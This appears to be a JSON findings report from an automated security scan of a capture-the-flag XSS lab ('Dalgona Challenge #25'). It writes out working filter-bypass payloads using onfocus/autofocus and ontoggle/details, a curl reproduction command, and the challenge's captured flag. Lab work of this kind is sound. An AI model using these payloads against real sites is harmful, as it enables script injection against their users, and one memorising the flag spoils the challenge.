@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T20:49:49.751632+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "ded4e294-fb82-4137-a047-19c27af5f819",
+      "timestamp": "2026-04-12T20:49:49.751526+00:00",
+      "title": "XSS Filter Bypass - Dalgona Challenge #25",
+      "severity": "critical",
+      "target": "http://172.17.0.1:38149/xss25",
+      "description": "The /xss25 endpoint implements a server-side XSS filter that blocks certain keywords (script, onerror, onload, onmouseover, single quotes) but fails to block all HTML event handlers. Using onfocus with autofocus or ontoggle with details open tag bypasses the filter and executes JavaScript. The flag is revealed upon successful XSS execution.",
+      "evidence": "POST /xss25 with solution=<input onfocus=alert(\"XSS\") autofocus> bypassed filter and returned flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}\n\nAlso works: solution=<details ontoggle=alert(\"XSS\") open>\n\nBlocked keywords: script, onerror, onload, onmouseover, single quotes (')\nNot blocked: onfocus, ontoggle, double quotes\n\nFLAG: flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X POST http://172.17.0.1:38149/xss25 -d 'solution=<input onfocus=alert(\"XSS\") autofocus>'",
+        "expected": "Returns Congratulations page with flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "cf0c1de5-9e38-4aff-acf9-5e57ba760898",
+      "timestamp": "2026-04-12T20:49:58.480434+00:00",
+      "title": "Dalgona XSS Challenge - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Home[\"GET / - Dalgona Challenges Index\"]\n  Home --> XSS25[\"GET/POST /xss25 - XSS Challenge #25\"]\n  XSS25 --> Filter[\"Server-side XSS Filter\\n(blocks: script, onerror, onload, onmouseover, single quotes)\"]\n  Filter -->|\"Blocked\"| Error[\"Error: Sorry you cannot use X\"]\n  Filter -->|\"Bypassed via onfocus/ontoggle\"| Flag[\"Flag Revealed: flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}\"]\n  XSS25 --> Static[\"GET /static/* - CSS/Images\"]\n  Server[\"Werkzeug/3.1.8 Python/3.11.15\"] --> Home"
+    }
+  ]
+}
